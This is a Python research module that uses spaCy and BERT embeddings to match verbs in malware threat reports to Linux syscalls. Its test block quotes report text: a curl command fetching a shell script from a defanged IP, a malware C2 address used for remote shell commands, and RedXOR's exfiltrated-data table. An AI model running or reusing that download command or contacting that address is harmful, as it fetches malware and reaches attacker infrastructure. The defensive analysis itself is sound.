# import re
# import os
# from os import listdir
# from os.path import isfile, join
# from pathlib import Path
# import pandas as pd
from typing import Callable, Dict, List, get_type_hints
import pandas as pd
import numpy as np
import spacy
from spacy import displacy
from spacy.lang.char_classes import ALPHA, ALPHA_LOWER, ALPHA_UPPER, HYPHENS
from spacy.lang.char_classes import CONCAT_QUOTES, LIST_ELLIPSES, LIST_ICONS
from spacy.util import compile_infix_regex
from scipy.spatial.distance import cosine
import os, psutil
import torch
from transformers import BertTokenizer, BertModel
import hashlib
import pickle
import logging

# https://stackoverflow.com/questions/66636097/prevent-spacy-tokenizer-from-splitting-on-specific-character
def prepare_nlp() -> Callable:
    nlp = spacy.load("en_core_web_sm")
    text = "Get 10ct/liter off when using our App"
    # Modify tokenizer infix patterns
    infixes = (
        LIST_ELLIPSES
        + LIST_ICONS
        + [
            r"(?<=[0-9])[+\-\*^](?=[0-9-])",
            r"(?<=[{al}{q}])\.(?=[{au}{q}])".format(
                al=ALPHA_LOWER, au=ALPHA_UPPER, q=CONCAT_QUOTES
            ),
            r"(?<=[{a}]),(?=[{a}])".format(a=ALPHA),
            r"(?<=[{a}])(?:{h})(?=[{a}])".format(a=ALPHA, h=HYPHENS),
            #r"(?<=[{a}0-9])[:<>=/](?=[{a}])".format(a=ALPHA),
            r"(?<=[{a}0-9])[:<>=](?=[{a}])".format(a=ALPHA),
        ]
    )
    infix_re = compile_infix_regex(infixes)
    nlp.tokenizer.infix_finditer = infix_re.finditer

    return nlp

# a global funciton
customized_nlp = prepare_nlp()

def find_verb_of_vocab(sentence: str, target_word: str, lemma=True):
    'Pass a sentence and a target_word, return the verb operates on the target_word or None. Lemmatization applied at default.'
    doc = customized_nlp(sentence)
    # find the target_word element (excat match)
    target_elem = None
    for i,token in enumerate(doc):
        if token.text == target_word:
            target_elem = token
    if target_elem is None:
        return None
    # find the verb parent of the target_word element
    token = target_elem
    while token.head != token:
        token = token.head
        # verb found
        if token.tag_.startswith('VB'):
            if lemma:
                return token.lemma_
            return token.text
    return None

def syscall_verb_analysis(syscall: str, en_verb: str) -> tuple[bool, int]:
    '''Pass a syscall and a verb, return they are similiar or not and the weight (2 or 1).
    @return similiarity: boolean, weight: int'''
    return 

from enum import Enum

class OperationMode(Enum):
    FILE_READ_CLOSE = 0
    FILE_CREATE_OPEN = 1
    FILE_UPDATE = 2
    FILE_DELETE = 3
    PROCESS_EXE = 4
    PROCESS_KILL = 5
    PROCESS_Other = 6
    DEVICE = 7
    INFO_GET = 8
    INFO_SET = 9
    COMM_CONNECT = 10
    COMM_TRANSMIT = 11

class OperationEvaluator:
    def __init__(self) -> None:
        self.rule_dataset_path = "../rule_dataset.csv"
        self.df = self.read_rule()
        self.update_syscall_list = list(self.df[self.df['ActionType'].isin(['UPDATE'])]['Syscall'].unique())
        # Load pre-trained model tokenizer (vocabulary)
        self.tokenizer = BertTokenizer.from_pretrained('bert-base-uncased')
        # Load pre-trained BERT model (weights)
        self.model = BertModel.from_pretrained('bert-base-uncased',
                                        output_hidden_states = True,) # Whether the model returns all hidden-states.
        # Put the model in "evaluation" mode, meaning feed-forward operation.
        self.model.eval()
        self.md5 = hashlib.md5()
        # preprare the verb vectors for every sentence
        self.verb_vector_list = []
        self.init_word_vectors()
        logging.basicConfig(filename='Bert_alt_verb.log', filemode='a', encoding='utf-8', level=logging.DEBUG)
        pass

    def read_rule(self) -> pd.DataFrame:
        df = pd.read_csv(self.rule_dataset_path)

        def clean_braces(x):
            x = x.replace("()", "").replace(",", "").replace(" ", "")
            return str(x)

        df['Syscall'] = df['Syscall'].apply(clean_braces)
        return df
    
    def _format_type(self, in_type:str) -> str|None: # todo: add type ID
        if in_type is None:
            raise ValueError("_format_type() get a 'None' in_type param") 
        entityType = in_type.upper()
        if entityType.startswith('ID'):
            entityType = 'ID'
        if entityType.startswith('PROC'):
            entityType = 'PROC'
        if entityType.startswith('NET'):
            entityType = 'NET'
        if entityType.startswith('INFO'):
            entityType = 'INFO'
        entityType_lst = ['FILE', 'PROC', 'DEVICE', 'INFO', 'NET', 'ID', 'MEM']
        if entityType not in entityType_lst:
            return None
        return entityType

    def translate_rule(self, entityType: str, enVerb: str, object: str=None) -> list[str] | None:
        ''' translate a given enverb into system call(s) with hardcoded rule '''
        entityType = self._format_type(entityType)
        
        # Get rules belongs to this entityType
        dataFileType = self.df[self.df['EntityType'] == entityType]
        dataEnVerb = dataFileType.loc[dataFileType['EnVerb'].isin([enVerb])]
        if len(dataEnVerb) == 0:
            return None
        return list(dataEnVerb['Syscall'].unique())

    # The main mathod provide by this moduel
    def resolve(self, entityType: str, syscall:str, en_verb:str, downcast=False, 
                use_bert=True, sentence:str =None) -> tuple[bool,bool]:
        ''' @hit: judge if syscall and en_verb match. @isSysChange: if syscall update system settings. 
            @param: use_bert=True, means select a most similar verb in rule as alternative when OoV. 
            @param: sentence, must pass in when use_bert=True. '''
        hit, isSysChange = False, False
        if entityType.upper() == "FILE" and syscall in self.update_syscall_list:
            isSysChange = True

        entityType = self._format_type(entityType)
        corresponding_syscall_list = self.translate_rule(entityType, en_verb)
        if corresponding_syscall_list and syscall in corresponding_syscall_list:
            hit = True
            # verb refinement, add a black list of ev_verb. these words are not verb.
            if en_verb in ['m6_6n3', 'se', 'resolv.conf']:
                hit = False
        else:
            # en_verb not in rule, select a alternative one
            if sentence:
                wvec = self.word_vector_from_BERT(en_verb, sentence) # 句子過長或句中找不到動詞
                if wvec is None:
                    return False, isSysChange
                # get rule indexs for this entityType
                # calc similarity for each wvec of rules
                # get max similarity verb as alternative
                # judge hit or not
                dataFileType = self.df[self.df['EntityType'] == entityType]
                sim_arr = np.zeros(len(dataFileType.index))
                # print(dataFileType.index)
                for i, rule_id in enumerate(dataFileType.index):
                    rule_wvec = self.verb_vector_list[rule_id]
                    # print(rule_id, wvec.shape, rule_wvec.shape)
                    cos = self.cosine_similarity(wvec, rule_wvec)
                    sim_arr[i] = cos
                argmax = np.argmax(sim_arr)
                max_rule_id = dataFileType.index[argmax]
                alternative_verb = self.df.iloc[max_rule_id]['EnVerb']
                corresponding_syscall_list = self.translate_rule(entityType, alternative_verb)
                if syscall in corresponding_syscall_list:
                    hit = True
                sentence = " ".join(sentence.splitlines())
                logging.info(f" {en_verb:15} => {alternative_verb:15} | cos: {sim_arr[argmax]:.4f} | {sentence}")
                # 解釋性的 code
                # sort_ids = (-sim_arr).argsort()[:len(sim_arr)] # 大到小
                # sort_ids = np.argsort(sim_arr) # 小到大
                # for id in sort_ids:
                #     cos = sim_arr[id]
                #     rule_id = dataFileType.index[id]
                #     verb = self.df.iloc[rule_id]['EnVerb']
                #     print(f"{rule_id} {verb:12} {cos:.4f}")
            else:
                hit = False

        return hit, isSysChange
    
    def find_word_index(self, target_word:str, tokenized_text:list) -> int:
        ''' return the index of first occur target_word '''
        for i, token_str in enumerate(tokenized_text):
        # 先不處理變化的過去式、過去分詞
            if token_str.startswith(target_word[0]) and token_str.find(token_str) >= 0:
                return i
        return None

    def word_vector_from_BERT(self, target_word:str, sentence:str):
        # Add the special tokens.
        marked_text = "[CLS] " + sentence + " [SEP]"
        # Split the sentence into tokens. 先不處理過長的句子
        tokenized_text = self.tokenizer.tokenize(marked_text)
        if len(tokenized_text) > 512:
            logging.info(f" sentence is too long ({len(tokenized_text)})")
            return None
        target_word_id = self.find_word_index(target_word, tokenized_text)
        if target_word_id is None:
            return None
        # print("target_word_id", target_word_id, tokenized_text[:target_word_id+1])
        # Map the token strings to their vocabulary indeces.
        indexed_tokens = self.tokenizer.convert_tokens_to_ids(tokenized_text)
        # Mark each of the tokens as belonging to sentence "1". (max 768 words)
        segments_ids = [1] * len(tokenized_text)
        # Convert inputs to PyTorch tensors
        tokens_tensor = torch.tensor([indexed_tokens])
        segments_tensors = torch.tensor([segments_ids])

        # Run the text through BERT, and collect all of the hidden states produced
        with torch.no_grad():
            outputs = self.model(tokens_tensor, segments_tensors)
            BERT_hidden_states = outputs.hidden_states # same as outputs[2]

        token_embeddings = torch.stack(BERT_hidden_states, dim=0) # [13, 1, 22, 768]
        token_embeddings = torch.squeeze(token_embeddings, dim=1) # [13, 22, 768]
        token_embeddings = token_embeddings.permute(1,0,2)        # [22, 13, 768] place words' dimensions at front

        # Stores the token vectors, with shape [22 x 768]
        token_vecs_sum = []
        # For each token in the sentence...
        for token in token_embeddings:
            # `token` is a [12 x 768] tensor
            # "Sum" the vectors from the last four layers.
            sum_vec = torch.sum(token[-4:], dim=0)
            # Use `sum_vec` to represent `token`.
            token_vecs_sum.append(sum_vec)

        return token_vecs_sum[target_word_id] # return torch.tensor or numpy ?

    def cosine_similarity(self, word_vector_1, word_vector_2):
        return 1 - cosine(word_vector_1, word_vector_2)

    def string_to_md5(self, sentence:str) -> str:
        self.md5.update(sentence.encode("utf-8"))
        h = self.md5.hexdigest()
        return h

    def rulefile_to_md5(self):
        with open(self.rule_dataset_path, "rb") as f:
            # 分批讀取檔案內容，計算 MD5 雜湊值
            for chunk in iter(lambda: f.read(4096), b""):
                self.md5.update(chunk)

        h = self.md5.hexdigest()
        return(h)

    # write list to binary file
    def _write_list(self, fname, a_list):
        # store list in binary file so 'wb' mode
        with open(fname, 'wb') as fp:
            pickle.dump(a_list, fp)

    # Read list to memory
    def _read_list(self, fname) -> list:
        # for reading also binary mode is important
        with open(fname, 'rb') as fp:
            n_list = pickle.load(fp)
            return n_list

    def init_word_vectors(self):
        os.makedirs("./verb_tensors", exist_ok=True)
        hash_path = "./verb_tensors/rule_csv_hash.txt"
        tensor_path = "./verb_tensors/tensor.pkl"
        current_hash = self.rulefile_to_md5()
        
        generate = False
        if not os.path.isfile(tensor_path):
            # print("line 231", os.path.isfile(tensor_path))
            generate = True
        else:
            with open(hash_path) as f:
                history_hash = f.read()
            if history_hash != current_hash:
                # print("line 237", history_hash, current_hash)
                generate = True
        if not os.path.isfile(tensor_path):
            generate = True

        # read existing verb_vector_list
        if not generate:
            self.verb_vector_list = self._read_list(tensor_path)
            if len(self.verb_vector_list) == len(self.df):
                return
            else:
                generate = True
        # print('generate', generate)

        # verb_vector_list is outofdate or none, create and save it
        if generate:
            for id, row in self.df.iterrows():
                wvec = self.word_vector_from_BERT(row['EnVerb'], row['Sentence']) 
                self.verb_vector_list.append(wvec)
            self._write_list(tensor_path, self.verb_vector_list)
            with open(hash_path, 'w') as f:
                f.write(current_hash)


if __name__ == '__main__':
    # test 1, <connects, 23.224.59.34:48080>
    sentence = 'the malware also connects to 23.224.59.34:48080 to send and receive remote shell commands'
    target_word = '23.224.59.34:48080'
    verb = find_verb_of_vocab(sentence, target_word)
    print(f'test1: {verb}')

    # test 2, <opened, /proc/cpuinfo>
    sentence = 'the virtual file /proc/cpuinfo is opened and read in words'
    target_word = '/proc/cpuinfo'
    verb = find_verb_of_vocab(sentence, target_word)
    print(f'test2: {verb}')

    oE = OperationEvaluator()

    # check wvec integrety
    text1 = "read from a file descriptor"
    vec1 = oE.word_vector_from_BERT("read", text1)
    vec2 = oE.verb_vector_list[0]
    print(oE.cosine_similarity(vec1, vec2)) # 1 they must be same
    text1 = "curl -o /tmp/russ http://106[.].246.224.219/russia.sh); "
    vec1 = oE.word_vector_from_BERT("curl", text1)
    vec2 = oE.verb_vector_list[-1]
    print(oE.cosine_similarity(vec1, vec2)) # 1 they must be same

    # same word "read" from different sentence in "read()" and "readlink()"
    text1 = "read from a file descriptor"
    text2 = "read value of a symbolic link"
    vec1 = oE.word_vector_from_BERT("read", text1)
    vec2 = oE.word_vector_from_BERT("read", text2)
    print(oE.cosine_similarity(vec1, vec2)) # 0.78464

    # same word "gather" from different sentence in type FILE
    text1 = "Once the malware has infected a system, it can gather system information, including model ID and CPU description, speed, family, model, and type."
    text2 = "This Backdoor gathers the following data: CPU information Memory statistics IP address of infected machine Reads the following information from /proc:"
    vec1 = oE.word_vector_from_BERT("gather", text1)
    vec2 = oE.word_vector_from_BERT("gather", text2)
    print(oE.cosine_similarity(vec1, vec2)) # 0.75977

    # different word in same syscall discription
    text1 = "check real user's permissions for a file"
    text2 = "access() checks whether the calling process can access the file pathname."
    vec1 = oE.word_vector_from_BERT("check", text1)
    vec2 = oE.word_vector_from_BERT("access", text2)
    print(oE.cosine_similarity(vec1, vec2)) # 0.42888

    # same word "get" from different sentence in type
    text1 = "get user identity" # id
    text2 = "get file status"   # file
    vec1 = oE.word_vector_from_BERT("get", text1)
    vec2 = oE.word_vector_from_BERT("get", text2)
    print(oE.cosine_similarity(vec1, vec2)) # 0.91526

    # OperationEvaluator test case
    res = oE.resolve('File', 'readlink', 'read') # (True, False)
    print(res)
    res = oE.resolve('File', 'linkat', 'read')  # (False, False)
    print(res)
    res = oE.resolve('File', 'statfs', 'retrieve', sentence='retrieve data from a file or directory') # OoV
    print(res)                                  # (False, False)
    
    text = """Table 2: Data collected by the malware and sent back to the C2 server
URL key	Description	Comment
hostip	IP	Hardcoded to 127.0.0.1
softtype		Hardcoded to “Linux”
pscaddr	MAC address	
hostname	Machine name	
hosttar	Username	Possibly “host target”
hostos	Distribution	Extracted from /etc/issue or /etc/redhat-release
hostcpu	Clock speed	/proc/cpuinfo
hostmem	Amount of memory	/proc/meminfo
hostpack		Hardcoded to “Linux”
lkmtag	Is rootkit enabled	
kernel	Kernel version	Extracted from unameFigure 12 shows the communication between RedXOR and the C2. The malware sends the password “pd=admin” and C2 responds with “all right” (JSESSIONID=0000). Next, the malware sends the system information and the C2 replies with the ping command (JSESSIONID=1000).
Figure 12: RedXOR communication with C2"""
    res = oE.resolve('NET', 'connect', 'hardcode', sentence=text) # OoV
    print(res)                                  # 

    # OperationEvaluator test case
    # operationEvaluator = OperationEvaluator()
    # res = operationEvaluator.resolve('linkat', 'read')
    # print(res) # True [OperationMode.FILE_READ_CLOSE, OperationMode.FILE_READ_CLOSE]
    # res = operationEvaluator.resolve('linkat', 'connect')
    # print(res) # False
    # res = operationEvaluator.resolve('ioctl', 'send')
    # print(res) # [OperationMode.DEVICE, OperationMode.DEVICE]

    # mode = operationEvaluator.get_mode('linkat')
    # print("mode of 'linkat':", mode) # OperationMode.FILE_READ_CLOSE
    # mode = operationEvaluator.get_mode('read')
    # print("mode of 'read':", mode)   # OperationMode.FILE_READ_CLOSE
    # mode = operationEvaluator.get_mode('connect')
    # print("mode of 'connect':", mode) # OperationMode.COMM_TRANSMIT
    # mode = operationEvaluator.get_mode('install')
    # print("mode of 'install':", mode) # OperationMode.PROCESS_EXE
    # mode = operationEvaluator.get_mode('send')
    # print("mode of 'send':", mode) # OperationMode.COMM_CONNECT (其實也屬於DEVICE，但只能做到return一個mode)
    